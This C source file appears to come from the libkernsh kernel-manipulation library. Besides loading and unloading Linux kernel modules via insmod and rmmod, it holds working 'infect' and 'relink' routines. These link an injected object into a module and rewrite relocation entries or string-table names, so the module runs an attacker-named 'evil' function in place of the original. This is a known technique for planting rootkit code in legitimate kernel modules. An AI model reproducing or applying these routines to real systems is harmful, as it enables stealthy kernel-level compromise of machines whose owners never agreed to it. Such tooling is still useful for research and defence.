/*
** @file module.c 
** @ingroup libkernsh_user
**
*/
#include "libkernsh.h"

/**
 * @brief Load a loadable kernel module
 * @param name Module's pathname
 * @return 0 on success, -1 on return
 */
int kernsh_kload_module(char *name)
{
  int		ret;
  unsigned int         dim[2];
  vector_t      *kload;
  int          (*fct)();
  char		buff[BUFSIZ];
  struct stat	binary;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KLOAD MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (name == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  if (stat(name, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       name);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }
  
  kload = aspect_vector_get(LIBKERNSH_VECTOR_NAME_KLOADMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(kload, dim);
  
  ret = fct(name);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

/**
 * @brief Load a linux loadable kernel module\n
 * Configure :\n
 * LIBKERNSH_VMCONFIG_KLOAD
 * @param name Module's pathname
 * @return 0 on success, -1 on return
 */
int kernsh_kload_module_linux(char *name)
{
  int ret = 0;
  extern char **environ;
  char *params[] = { "insmod", name, NULL };

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KLOAD MODULE LINUX\n");
#endif

  if(fork() == 0)
    ret = execve((char *) config_get_data(LIBKERNSH_VMCONFIG_KLOAD), params, environ);
  else
    wait(NULL);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

/**
 * @brief Unload a loadable kernel module
 * @param name Module's name
 * @return 0 on success, -1 on return
 */
int kernsh_kunload_module(char *name)
{
  int		ret;
  unsigned int         dim[2];
  vector_t      *kunload;
  int          (*fct)();
  char		buff[BUFSIZ];

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KUNLOAD MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (name == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  kunload = aspect_vector_get(LIBKERNSH_VECTOR_NAME_KUNLOADMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(kunload, dim);
  
  ret = fct(name);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

/**
 * @brief Unload a linux loadable kernel module\n
 * Configure :\n
 * LIBKERNSH_VMCONFIG_KUNLOAD
 * @param name Module's name
 * @return 0 on success, -1 on return
 */
int kernsh_kunload_module_linux(char *name)
{
  int ret = 0;
  extern char **environ;
  char *params[] = { "rmmod", name, NULL };

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KUNLOAD MODULE LINUX\n");
#endif

  if(fork() == 0)
    ret = execve((char *) config_get_data(LIBKERNSH_VMCONFIG_KUNLOAD), params, environ);
  else
    wait(NULL);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

/**
 * @brief Relink a loadable kernel module
 * @param orig Original module's pathname
 * @param injec Injected module's pathname
 * @param evil New module's pathname
 * @return 0 on success, -1 on return
 */
int kernsh_relink_module(char *orig, char *injec, char *evil)
{
  int		ret;
  unsigned int         dim[2];
  vector_t      *rel;
  int          (*fct)();
  char		buff[BUFSIZ];
  struct stat	binary;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("RELINK MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (orig == NULL || injec == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  if (stat(orig, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       orig);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }
  
  if (stat(injec, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       injec);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }

  rel = aspect_vector_get(LIBKERNSH_VECTOR_NAME_RELINKMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(rel, dim);

  if (evil == NULL)
    ret = fct(orig, injec, orig);
  else
    ret = fct(orig, injec, evil);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

/**
 * @brief Relink a linux loadable kernel module
 * @param orig Original module's pathname
 * @param injec Injected module's pathname
 * @param evil New module's pathname
 * @return 0 on success, -1 on return
 */
int kernsh_relink_module_linux(char *orig, char *injec, char *evil)
{
  int ret = 0;
  extern char **environ;
  char *params[] = { "ld", "-r", orig, injec, "-o", evil, NULL};

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);
  
#if __DEBUG_KERNSH__
  printf("RELINK MODULE LINUX\n");
#endif

  if(fork() == 0)
    ret = execve((char *) config_get_data(LIBKERNSH_VMCONFIG_LD), params, environ);
  else
    wait(NULL);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

/**
 * @brief Replace a function in a loadable kernel module
 * @param module Module's pathname
 * @param original_fname Original function's name
 * @param evil_fname New function's name
 * @return 0 on success, -1 on return
 */
int kernsh_infect_module(char *module, 
			 char *original_fname, char *evil_fname)
{
  int		ret;
  unsigned int         dim[2];
  vector_t      *inf;
  int          (*fct)();
  char		buff[BUFSIZ];
  struct stat	binary;
  elfshobj_t	*mod;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("INFECT MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (module == NULL || original_fname == NULL || evil_fname == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  if (stat(module, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       module);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }

  mod = kernsh_load_file(module);
  if (mod == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to load module", -1);
    }

  inf = aspect_vector_get(LIBKERNSH_VECTOR_NAME_INFECTMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(inf, dim);

  ret = fct(module, mod, original_fname, evil_fname);

  kernsh_unload_file(mod);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int get_symbol_idx(elfshobj_t *file, elfsh_Sym *table, int num, char *symbol)
{
  int idx, index;
  char *name;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

  idx = -1;

  for (index = 0; index < num; index++)
    {
      name = elfsh_get_symbol_name(file, table + index);
      if (!strcmp(name, symbol))
	idx = index;
    }

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, idx);
}

/**
 * @brief Replace a function in a linux 2.6.X loadable kernel module
 * @param module Module's pathname
 * @param mod Module's elf object
 * @param original_fname Original function's name
 * @param evil_fname New function's name
 * @return 0 on success, -1 on return
 */
int kernsh_infect_module_linux_2_6(char *module, elfshobj_t *mod,
				   char *original_fname, char *evil_fname)
{
  int ret, num, index, strindex, nbr, idx_init, idx_ninit, end, size;
  elfshsect_t *sct, *gnu;
  elfsh_Sym *table;
  elfsh_Rel *rel, *cur;
  unsigned int idx;
  void *data;
  char buff[BUFSIZ];

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

  ret = -1;
  num = end = 0;
  idx_init = idx_ninit = -1;
  
  memset(buff, '\0', sizeof(buff));
  
#if __DEBUG_KERNSH__
  printf("INFECT MODULE LINUX 2.6\n");
#endif

  sct = elfsh_get_section_by_type(mod,
				  SHT_SYMTAB, 0, NULL, NULL, 0);

  if (sct == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to get SYMTAB", -1);
    }

  elfsh_get_symtab(mod, &num);
  table = (elfsh_Sym *) (sct->data);

  if (table == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to find data", -1);
    }

  idx_init = get_symbol_idx(mod, table, num, original_fname);
  
  idx_ninit = get_symbol_idx(mod, table, num, evil_fname);

#if __DEBUG_KERNSH__
  printf("idx_init %d\n", idx_init);
  printf("idx_ninit %d\n", idx_ninit);
#endif

  if (idx_init == -1 || idx_ninit == -1)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Symbol doesn't exist", -1);
    }

  rel = elfsh_get_relent_by_name(mod, original_fname);

  gnu = elfsh_get_section_by_name(mod, 
				  LIBKERNSH_STRING_REL_GNU, 
				  &index, 
				  &strindex, 
				  &nbr);
  if (gnu == NULL)
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       LIBKERNSH_STRING_REL_GNU);

      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }

  if (gnu->data == NULL)
    gnu->data = elfsh_load_section(mod, gnu->shdr);

  size = gnu->shdr->sh_size / sizeof(elfsh_Rel);

  for (idx = 0; idx < size && !end; idx++)
    {
      data = elfsh_get_raw(gnu);
      cur = (void *) ((elfsh_Rel  *) data + idx);
      if (elfsh_get_relsym(cur) == idx_init)
	{
	  elfsh_set_relsym(cur, idx_ninit);
	  end = 1;
	}
    }

  if (end == 0)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Symbol is not in reloc section", -1);
    }

  elfsh_save_obj(mod, mod->name);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);
}

/**
 * @brief Replace a function in a linux 2.4.X loadable kernel module
 * @param module Module's pathname
 * @param mod Module's elf object
 * @param original_fname Original function's name
 * @param evil_fname New function's name
 * @return 0 on success, -1 on return
 */
int kernsh_infect_module_linux_2_4(char *module, elfshobj_t *mod,
				   char *original_fname, char *evil_fname)
{
  elfshsect_t *strtab;
  elfsh_Sym *so;
  int strindex;
  int index;
  int nbr;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("INFECT MODULE LINUX 2.4\n");
#endif

  if (strlen(original_fname) != strlen(evil_fname))
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Argument 2 has not the same lenght as arguement 3", -1);
    }

  strtab =  elfsh_get_section_by_name(mod, ".strtab", &index, &strindex, &nbr);
  if (strtab == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to find .strtab", -1);
    }

  so = elfsh_get_symbol_by_name(mod, original_fname);
  if (so == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to find original function name", -1);
    }

  elfsh_raw_write(mod, strtab->shdr->sh_offset + so->st_name, evil_fname, strlen(evil_fname));
  elfsh_save_obj(mod, mod->name);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);
}
